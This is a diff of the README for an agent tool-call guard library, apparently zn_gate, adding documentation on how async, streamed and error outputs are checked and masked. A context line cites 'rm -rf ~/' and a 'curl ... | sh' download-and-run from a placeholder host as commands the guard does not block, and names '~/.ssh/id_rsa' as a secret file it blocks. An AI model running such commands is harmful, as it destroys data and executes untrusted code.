@@ -121,6 +121,14 @@ Arguments are checked before the function runs; with `on_block="raise"` a blocke
 
 The checks read every string inside the arguments: dict keys and values, lists, tuples, sets, dataclasses, pydantic models and the attributes of other objects (the `self` or `cls` of a method is skipped). The run-context objects that agent frameworks pass to a tool (pydantic-ai `RunContext`, Google ADK `ToolContext`, OpenAI Agents SDK `ToolContext` and `RunContextWrapper`, LangChain callback managers and `RunnableConfig`) are not checked, and other application objects (a client, a session, your dependencies) are read best effort: what is nested too deep to read is left out instead of blocking the call. Data models (dataclasses, pydantic, attrs) are always read in full. A generator or other one-shot iterator is blocked (rule `type:unscannable`), because checking it would use it up: pass a list instead. Strings longer than 256 KB are checked in overlapping windows up to 4 MB; past that the result has `truncated=True`, and `block_truncated=True` or `ZN_BLOCK_TRUNCATED=1` blocks it (rule `size:truncated`).
 
+#### Async tools, streamed output and errors
+
+With `check_result` or `mask_secrets` (on by default in `guarded_tool`), `@guard` and `guarded_tool` handle every form of tool output the same way:
+
+- **Async**: `async def` functions, callable objects whose `__call__` is `async def`, and sync functions that return a coroutine are awaited, then checked and masked.
+- **Streamed output**: a generator or async generator is passed on chunk by chunk. Each chunk is checked (together with the end of the previous chunk, so a phrase split in two is still found) and masked. A blocked chunk ends the stream: `GuardBlockError`, or the `fallback` as the last chunk with `on_block="return"`. A secret split across two chunks is not masked, so do not stream secrets in small pieces.
+- **Errors**: agent frameworks send the message of a tool's exception to the model (LangChain `handle_tool_error`, LangGraph `ToolNode`, the OpenAI Agents SDK, CrewAI), so it is checked and masked like the output. A blocked message raises `GuardBlockError` (or returns the `fallback`). A message with a secret is raised again as an exception of the same type that carries only the masked message, without the original exception attached; when the type cannot be rebuilt that way, `zn_gate.guard.MaskedToolError` (a `RuntimeError`) is raised instead. Other exceptions are raised unchanged.
+
 `@guard`, `guarded_tool` and `check_tool_call` run the same text rules as `evaluate` on every string in the arguments: they block prompt-injection wording and secret-file names such as `~/.ssh/id_rsa`. They do not understand shell commands, so a call such as `rm -rf ~/` or `curl https://example.invalid/x.sh | sh` is allowed. Decide in your own code which tools may delete files or run commands.
 
 ### LangChain / LangGraph
@@ -170,7 +178,7 @@ def query_knowledge_base(query: str) -> str:
 
 `check_result=True` also scans what the tool returns for prompt injection before the agent sees it (off by default, so existing tools behave as before).
 
-`guarded_tool` also works on `async def` tools and on callable objects whose `__call__` is `async def`: the call is awaited, then the output is checked and masked exactly as for a sync tool. A sync function that returns a coroutine is not checked or masked, so declare the tool with `async def` instead. With `check_result=True`, a tool that returns a generator or an async generator is blocked, because its output cannot be checked without using it up.
+`guarded_tool` also works on `async def` tools, on callable objects whose `__call__` is `async def` and on sync functions that return a coroutine: the call is awaited, then the output is checked and masked exactly as for a sync tool.
 
 ### LlamaIndex
 
